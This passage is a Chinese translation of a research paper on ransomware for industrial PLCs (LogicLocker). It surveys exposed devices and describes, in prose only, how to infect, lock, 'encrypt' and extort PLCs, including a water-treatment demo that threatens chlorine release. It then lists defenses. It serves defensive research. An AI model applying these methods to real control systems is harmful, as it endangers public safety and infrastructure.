+&lt;p&gt;卡巴斯基安全智能公司在2016年7月对Shodan发现的设备进行了一项调查，重点关注他们发现的惊人数量的已知漏洞[4]。为了补充这项研究，我们对我们自己的简短调查我们目前知道将容易受到这里描述的勒索软件攻击的类型。在我们的实验室测试了来自流行厂商的两个设备，第三个设备在黑帽[14]的演示中被证明是易受影响的。表II总结了研究结果，显示当前攻击面对于希望在联网PLC上开始勒索软件活动的任何攻击者有多大。这只表示总潜在攻击面积的一小部分，因为在受害企业网络上的第一损害设备之后，有成千上万的PLC攻击者可以攻击目标。请注意，这里介绍的三个设备来自三个最受欢迎的PLC供应商。关于供应商如何实现密码认证的文档很难找到，但是这里的调查表明，这是所有供应商的一个常见的不良做法。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_51.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;B．  实验设置&lt;/p&gt;
+&lt;p&gt;图1所示的用于此概念验证版本的勒索软件的PLC包括Schneider Modicon M221，Allen Bradley MicroLogix 1400和Schneider Modicon M241。 Allen Bradley和Modicon代表了世界上一些最受欢迎的PLC品牌，但是我们要强调的是，多年来大多数PLC都没有正确验证编程登录的公开知识。 对于其他主要供应商，例如西门子，类似的攻击可以很容易地构建，如Black Hat演示文稿[14]所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_52.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;例如，MicroLogix 1400 PLC提供的一些安全特性是密码保护（来自编程软件）和一个OEM锁机制，要求用户（从编程软件）已经有一个具有匹配16位的PLC程序，在登录和读取它之前进行位校验和，以保护专有PLC程序免于好奇的用户修改。其他值得注意的功能包括向操作员发送通知的电子邮件客户端和使用非标准ICS协议进行通信的通用套接字接口。最后，为了解决这种选择的网络犯罪经济方面，目前在Shodan可以发现这种模型设备有1400多种。如果攻击者使用勒索软件破坏所有1,400设备，并要求赎金的数量级与学校和医院赎金在15,000美元相同的数量级，攻击者将从这个攻击单独赚取高达2100万美元。通过微小的修改，他可能重复使用相同的代码来瞄准同一PLC系列中的其他模型，以增加他的收入。同样，请注意，此计数仅考虑直接连接到互联网的MicroLogix 1400 PLC。单个大型制造设施可以在其控制网络上具有数百个PLC，攻击者可以通过首先破坏公司网络而纵向移动，从而总计达到成千上万的潜在目标。
+为了说明勒索软件攻击如何发生，建立了一个小规模的测试平台，如图2所示，用于模拟城市水处理设施的消毒阶段和存储阶段。 在消毒阶段，输入水的精确比率与氯混合。 在存储阶段，模拟设备保留最小量的预留水，以确保始终满足需求。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_53.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;6、攻击原理的分析&lt;/h2&gt;
+&lt;p&gt;提出的ICS勒索软件攻击的基本步骤包括感染，渗透，锁定，加密，最后勒索。 整个过程的时间线在图3中示出，其中表III到VII列出了攻击者在每个步骤处可用的选项。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_61.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;A、感染&lt;/h3&gt;
+&lt;p&gt;如第五节所示，目前有数千个PLC直接连接到互联网，并且很容易在Shodan上发现。在最简单的情况下，攻击者可以直接锁定一个连接互联网的PLC。在更复杂的情况下，攻击者可以使用标准恶意软件，首先感染受害者的公司网络上的工作站，然后，如果没有适当的网络分区，则可使用该机器作为控制网络中的跳板。虽然这可能需要更多的努力，但可以使用IT网络中的标准攻击方法，攻击脆弱的设备，同时在网络内部的周旋。众所周知，许多PLC在加载程序时不提供强身份认证，在最好的情况下，仅禁止来自网络的远程编程。在这种情况下，攻击者必须投入更多的时间和精力来寻找一个漏洞，利用它来为他提供编程访问。然而，鉴于ICS设备的性质和Shodan调查结果，设备经常带着已知漏洞运行了很长时间。此外，向ICSCERT报告的漏洞数量并没有减少，这表明仍有大量漏洞可以挖掘。网络犯罪分子可以找到相应的漏洞用于制造ICS勒索软件来实现它们的勒索攻击。表III总结了使用ICS勒索软件感染PLC的不同方法。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_62.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;B、渗透&lt;/h3&gt;
+&lt;p&gt;通过在横向，纵向或参考模型（图4 ）的整个受害者的网络中感染更多的PLC，攻击者可以增加他的预期利润。横向，攻击者可以通过感染受害者设施中的尽可能多的PLC来最大化他的利润，扩展到参考模型的第1级，如图5所示。他可以感染的PLC越多，他对“皇冠珠宝”的受害者的行动和更高的赎金，他可以要求。然而，如果他只感染一个PLC，他冒险的机会仍然可以运行在一些有限的能力与手动劳动或他们有一个备份PLC，他们可以快速交换。事实上，这种水平攻击将是最有利可图且容易实现的，因为存在相同型号的多个PLC（如在Stuxnet中）和来自具有共享漏洞的相同供应商的其它PLC的高概率。为了进一步加强对受害者的控制，他可以尝试在网络中纵向渗透，攻击具有标准恶意软件的人机界面（HMI）或工程工作站，以期加强勒索软件的持久性或窃取备份副本PLC程序。
+纵向渗透可以从PLC或公司网络开始实现。 如果初始感染是通过面向互联网的PLC，并且PLC支持像MicroLogix 1400这样的通用插座，则他可以使用PLC作为网络其余部分的后门。 如果最初的感染是通过企业网络像大多数真正的感染一样，他可以首先执行侦察，窃取任何有价值的数据，并等待关闭操作，直到他可以一次损害多个PLC，如图6所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_63.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_64.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;表四总结了在受害者网络中渗透的两种方法的优点和缺点。为了最大化有效性，攻击者也可以选择使用这两种方法。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_65.gif" /&gt; &lt;/p&gt;
+&lt;h3&gt;C、锁定&lt;/h3&gt;
+&lt;p&gt;由于ICS勒索软件攻击的大部分成功依赖于拥有基础设施操作的攻击者，他必须确保对PLC的访问被锁定以防止快速恢复。根据PLC上可用的功能，他可以采用几种方法的组合。
+最简单的方法是将PLC上的密码更改为攻击者选择的强随机密码。如前所述，许多PLC提供的密码认证实际上只在编程环境中检查，而不是PLC。因此，设计用于保护受害者的PLC的机制可能会阻止他用合法软件恢复它，而不采取任何措施来阻止攻击者。受害者当然可以编写他自己的定制软件以重新获得对PLC的访问，但是可能拒绝合法的软件供应商。根据同样的逻辑，攻击者然后可以尝试使用PLC的所有其他安全功能对其合法所有者尽可能地阻碍恢复。其他安全功能可能包括IP地址的访问控制列表，并启用OEM锁以保护专有PLC程序。
+如果PLC提供了在PLC端密码保护检测，由于PLC的低性能，导致即使是弱密码，通过网络暴力破解仍然需要花费很长时间。例如，本研究中使用的MicroLogix 1400在小于1m长的以太网电缆上具有大约1ms的往返延时时间（RTT），意味着大多数RTT正在处理ICMP回显请求。 假设密码检查与回应答复一样快的最佳情况下，强制恢复6位数字字母数字密码（通常被认为是弱密码）所需的时间大约为657天。
+防止恢复的其它方式不那么强，可以包括读取PLC中的状态寄存器，例如， 当前活动TCP连接，监视恢复尝试并且如果检测到则决定损害附接的设备。 或者，攻击者可以通过利用有限的资源环境来尝试锁定PLC。 许多PLC具有可以处理的最大活动TCP连接数，因此攻击者可以远程使用所有活动连接，或者潜在地使用通用套接字接口创建到本地主机地址的多个TCP连接。最后，为了增加更多的混乱和停机时间，勒索软件可以更改PLC的IP地址和它正在侦听的端口号。&lt;/p&gt;
+&lt;h3&gt;D、加密&lt;/h3&gt;
+&lt;p&gt;即使受害者通过成功绕过前一节中的锁定机制或重新刷新PLC来重新获得对PLC的编程访问权限，攻击者也已从PLC中删除了原始程序。 如果攻击者想要遵循加密勒索的传统步骤，他将在PLC上留下加密程序的副本。 然而，无论他写给PLC的什么程序仍然是可执行的，而不会在支付后崩溃或恢复。 因此，攻击者可以采取三种方法之一。
+最简单的方法是在攻击者的机器上对程序的原始二进制使用标准加密方案，并将其与赎金注释一起通过电子邮件发送给受害者。然后，当受害者付款时，向他们发送一个工具来解密二进制文件，并使用攻击者用来加载自己程序的相同技术将程序加载到PLC上。虽然这是最简单的方法，并且假设攻击者已经建立了与PLC的命令和控制连接，但是受害者可能很难相信攻击者将恢复PLC的程序。为了更具说服力，攻击者可以采取第二种方法，并且创造性地如何以加密的形式在PLC上离开程序。实现这种方法的最简单的方法是再次使用标准加密方案对程序的原始二进制进行加密，但将其作为原始字符串存储在PLC的存储器的数据部分中。然而，根据PLC的能力，它可能没有足够的数据存储器来存储整个PLC程序和攻击者的逻辑炸弹程序。所以攻击者可以采取第三和更复杂的方法加密程序，同时仍然确保它是可执行的。
+该第三种方法将涉及使用秘密密钥来随机地改变内容和控制程序的流程，以导致危险的不可预测的操作和原始程序的不可行的恢复。首先，为了改变程序的内容，攻击者的目标将是随机地改变对于控制系统的正确操作关键的变量，诸如定时器和计数器配置。这可以通过加密原始值并将其截断到必要的长度，例如16位计数器来容易地实现。第二，攻击者可以用它们的句法等同替换指令（例如与OR的AND，带有减法的加法），以确保程序仍然可执行。虽然这可能不是最安全或最有效的方法，但是一种容易理解的实现方法是首先将PLC的机器语言中的所有指令字节码分离成可以在语法上彼此替换的组，并将每个组置于循环队列。然后，攻击者选择强的随机种子值，并使用伪随机数生成器为程序中的每个指令生成随机队列旋转，并且用随机旋转之后的循环队列的头部处的任何等效指令替换每个指令。这实现了语法上等同的“加密”的行为。注意，用于保存用于赎金的程序的加密甚至不必在行业标准下被认为是安全的，它只需要减慢足够的恢复以使得支付赎金比恢复尝试更有吸引力。为了将这样的程序“解密”为原始，攻击者简单地重新生成随机数序列并且针对随机旋转以相反的方向旋转每个指令组队列。为了使恢复更难以实现，攻击者可以采用类似的可逆技术来将任意代码添加到PLC并且洗牌指令的顺序。&lt;/p&gt;
+&lt;h3&gt;E、勒索&lt;/h3&gt;
+&lt;p&gt;使用PLC上的有限资源通知受害者受害者也是非常重要的。 在最简单的情况下，攻击者可以单独发送电子邮件，通知受害者该危害并要求付款。 然而，为了更强力地展示力量，攻击者也可以利用PLC提供赎金票据。 某些PLC，如在用于勒索软件的MicroLogix型号中，具有嵌入式电子邮件客户端，通常用于向操作员自动发送警报。 攻击者可以重新编程PLC，直接从受害者自己的PLC发送赎金票据给受害者。 其他通知受害者的方法可包括更改PLC的Web界面。&lt;/p&gt;
+&lt;p&gt;从第四节中提出的论点来看，成功的勒索软件攻击不仅应该阻止用户访问PLC，而且还会威胁对昂贵的机器和人员的损害。 攻击者通过向受害者解释如果在某一截止日期之前没有收到付款，则会将该程序视为赎金谈判，该程序将被删除，PLC中的逻辑炸弹将开始销毁设备。 为了使这个逻辑炸弹更加有效，攻击者可以进行侦察，以获得对控制系统后面的物理设备的基本了解，这样他就可以知道造成伤害的最佳方式。 这可以通过研究在大多数PLC上可用的用户可定制的web界面或通过窃取来自网络上的工程工作站的数据来实现。 一旦受害者支付赎金，攻击者或者远程重新编程PLC到原来的功能，或者发送受害者一个工具这样做。&lt;/p&gt;
+&lt;h2&gt;7、勒索软件（LogicLocker）&lt;/h2&gt;
+&lt;p&gt;在这里为图2所示的测试平台开发的概念验证攻击采用了更简单的勒索软件循环中的步骤。首先，假设攻击者在互联网上使用Modicon M241强制弱密码或盗取合法凭证，并将其加载到勒索软件。然后，勒索软件扫描内部网络以查找易受攻击的PLC，以进一步感染。当易受攻击的PLC（Modicon M221和MicroLogix 1400）用新密码重新编程，将合法用户从官方编程软件中锁定时，可实现勒索软件的主要锁定方面。对于加密阶段，攻击者使用标准加密和为该受害者生成的密钥在自己的机器上手动加密被盗程序。在勒索阶段，使用勒索软件的攻击者从他自己的计算机向受害者发送电子邮件，通知他们妥协。如果赎金最后通过is支付，攻击者给受害者一个程序，将重新加载原始的程序，但如果没有支付，他威胁要把有害量的氯排入供水。为了最大化成功的机会，在通知受害者妥协之前，勒索软件首先允许储罐中的水位降低，同时向操作员发送错误读数。因此，考虑到支付和尝试恢复之间的选择，受害者还必须考虑等待太长时间并完全运行干净的水的影响。未来版本的勒索软件将使用PLC自己的电子邮件客户端发送此赎金记录。最后，一旦受害者支付，攻击者向受害者发送解密原始PLC程序并将其重新加载到受害PLC的工具。表VIII总结了勒索软件的各个部分，描述了ICS勒索软件攻击中的每个通用步骤。也可以在线找到解释设置[2]和攻击[1]的视频演示。&lt;/p&gt;
+&lt;h2&gt;8、防御&lt;/h2&gt;
+&lt;p&gt;大多数ICS设备供应商拒绝在其所有设备上提供通用安全特性，而是建议他们依赖于安全隔离设备或附加设备，将安全负担转嫁给最终用户身上。 然而，遵循标准的最佳措施可以大大降低这里描述的网络犯罪威胁模型的受害者的风险。 由于很少存在真实的隔离，因此应始终执行纵深防御战略。
+终端安全。 终端级别的纵深防御策略将包括更改所有默认密码，禁用对操作不重要的所有协议，尽可能使用访问控制列表，禁用远程编程，保持设备固件更新以及备份所有程序 文件。 当购买新设备时，请仔细考虑产品的安全特性，记住所有认证用户在编程环境下的PLC的密码保护信息，确保攻击者无法获取此信息。
+网络安全。 在网络层面，体系结构应该是分段的，IT网络和控制网络都应当监视可疑的活动，并且协议白名单应该在防火墙中实现。 控制网络拓扑结构通常是静态的，控制设备为了减小系统停机时间，没有特别计划是不会重新编程。 通过这种分析，当不同的IP地址开始通信或与计划维护不匹配的重新编程事件时就可以当作异常事件被检测到。 此外，PLC程序的自动备份可以帮助加快受害设施的恢复，而无需支付攻击者赎金。 本研究下一步工作，将调研远程软件认证技术，用于限止PLC程序的恶意更改。
+政策。 在最终用户层面，所有员工都应接受培训，以识别钓鱼电子邮件，并禁止使用自己的个人USB驱动器来降低被感染的风险。 此外，基础设施应该有一个事故应急响应计划，以便在发生安全事故时采取行动，并在安全的环境中进行应急演练。 这个响应计划可以包括保持关键程序的备份，并且需要有人员接受过如何快速重新刷新和恢复PLC程序的培训。 如果知识产权问题阻止设施拥有该计划的副本，与OEM厂商建立关系，以提供应急响应服务来恢复PLC。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/Ransomware_71.gif" /&gt; &lt;/p&gt;
+&lt;h2&gt;9、总结&lt;/h2&gt;
+&lt;p&gt;ICS网络到目前为止仍然基本上没有受到恶意软件的攻击，而不是因为它们比传统网络更安全，而是因为网络犯罪分子还没有找到一个有利可图的商业模式，值得他们的花费时间制造这种攻击。最近针对医院的攻击表明，通过操作具有人类伤害的关键资产时，勒索软件可以带来丰厚的利润，报告表明攻击者开始将注意力转移到ICS网络。为了在可能的ICS网络攻击来临之前有所准备，该研究开发了第一个已知的针对PLC的勒索软件，以便研究攻击和防御ICS网络的困难点。讽刺的是，我们发现许多最流行的供应商在其PLC上提供的弱安全机制，实际上在勒索软件上对合法用户造成的伤害远远大于防止攻击。在未来的工作中，为了提升防御技术，我们将继续调查更先进的锁定PLC的方法，以及开发远程检测技术，用于检测PLC程序何时被更改。&lt;/p&gt;
+&lt;h2&gt;参考资料&lt;/h2&gt;
+&lt;p&gt;[1] Plc ransomware worm demo. https://youtu.be/t4u3nJDXwes.
+[2] Water treatment testbed. https://youtu.be/KTKRjvTgTQI.
+[3] The economic impacts of the august 2003 blackout. Technical report, Electricity Consumers Resource Council, 02 2004.
+[4] The evolution of ransomware. Technical report, Kaspersky Security Intelligence, 07 2016.
+[5] Industrial cybersecurity threat briefing. Technical report, Booz Allen Hamilton, 06 2016.
+[6] D. Bisson. Half of american ransomware victims have paid the ransom, reveals study. http://www.tripwire.com/state-of-security/latest-nnsecurity-news/half-of-american-ransomware-victims-have-nnpaid-the-ransom-reveals-study/.
+[7] M. Burgess. Could hackers really take over a hotel? wired explains. http://www.wired.co.uk/article/austria-hotel-ransomware-true-doors-lock-hackers.
+[8] D. Fitzpatrick and D. Griffin. Cyber-extortion losses skyrocket, says fbi. http://money.cnn.com/2016/04/15/technology/ransomware-cyber-security/.
+[9] T. Fox-Brewster. Ransomware crooks demand \$70,000 after hacking san francisco transport system – updated. https://www.forbes.com/sites/thomasbrewster/2016/11/28/san-francisco-muni-hacked-ransomware/n#53cc57247061.
+[10] J. Klick, S. Lau, D. Marzin, J.-O. Malchow, and V. Roth. Internet-facing plcs - a new back orifice, 2015.
+[11] R. Langner. To kill a centrifuge. Technical report, The Langner Group, 11 2013.
+[12] B. McGee. Move over healthcare, ransomware has manufacturing in its sights. https://blog.fortinet.com/2016/06/06/move-over-nnhealthcare-ransomware-has-manufacturing-in-its-sights.
+[13] K. Savage, P. Coogan, and H. Lau. The evolution of ransomware. Technical report, Symantec, 08 2015.
+[14] R. Spenneberg, M. Brggemann, and H. Schwartke. Plc-blaster: A worm living solely in the plc, 2016.
+[15] H. Taylor. Ransomware: Lucrative, fast growing, hard to stop. http://www.cnbc.com/2016/04/11/ransomware-lucrative-fast-growing-hard-to-stop.html.
+[16] E. Vadala. Downtime costs auto industry $22k/minute- survey. http://news.thomasnet.com/companystory/downtime-costs-auto-industry-22k-minute-survey-481017.
+[17] T. J. Williams. The purdue enterprise reference architecture: a technical guide for cim planning and implementation. 1992.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">W3H</dc:creator><pubDate>Wed, 22 Feb 2017 19:24:00 +0800</pubDate><guid>tag:icsmaster.com,2017-02-22:news/Ransomware for Industrial Control Systems.html</guid><category>翻译</category></item></channel></rss>
